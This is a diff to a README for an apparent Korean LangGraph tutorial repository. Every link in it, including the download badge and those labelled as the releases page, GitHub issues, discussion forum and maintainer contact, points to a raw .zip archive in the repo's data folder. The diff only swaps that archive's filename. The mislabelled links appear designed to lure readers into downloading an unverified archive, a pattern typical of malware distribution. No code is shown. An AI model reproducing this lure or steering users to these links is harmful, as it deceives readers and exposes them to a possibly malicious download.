@@ -1,7 +1,7 @@
 ```markdown
 # 🌟 langgraph-v1-tutorial - Learn LangGraph Easily in Korean
 
-[![Download langgraph-v1-tutorial](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip%20release-brightgreen)](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip)
+[![Download langgraph-v1-tutorial](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip%20release-brightgreen)](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip)
 
 ## 📖 Introduction
 
@@ -18,13 +18,13 @@ To begin using the LangGraph V1 Tutorial, follow these simple steps:
    - Minimum 4GB RAM
    - At least 500MB of free disk space
 
-3. Visit the [Releases page](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip) to find the latest version of the tutorial.
+3. Visit the [Releases page](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip) to find the latest version of the tutorial.
 
 ## 📥 Download & Install
 
 To download the application, click the link below:
 
-[Download here!](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip)
+[Download here!](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip)
 
 Here’s how to install the software once you have downloaded it:
 
@@ -68,8 +68,8 @@ Absolutely! Your feedback is important. You can report any issues on the GitHub 
 
 Join our community to connect with other learners. Here, you can share your progress, ask questions, and collaborate on projects related to LangGraph.
 
-- [GitHub Issues](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip)
-- [Discussion Forum](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip)
 
 ## 📜 License
 
@@ -77,7 +77,7 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 ## ☎️ Contact
 
-For further questions or inquiries, please contact the project maintainer at [https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/langgraph-v1-tutorial_v3.2.zip).
+For further questions or inquiries, please contact the project maintainer at [https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip](https://raw.githubusercontent.com/Clapsxio/langgraph-v1-tutorial/main/data/v-langgraph-tutorial-2.3.zip).
 
 Thank you for choosing LangGraph V1 Tutorial. Enjoy your learning journey!
 ```
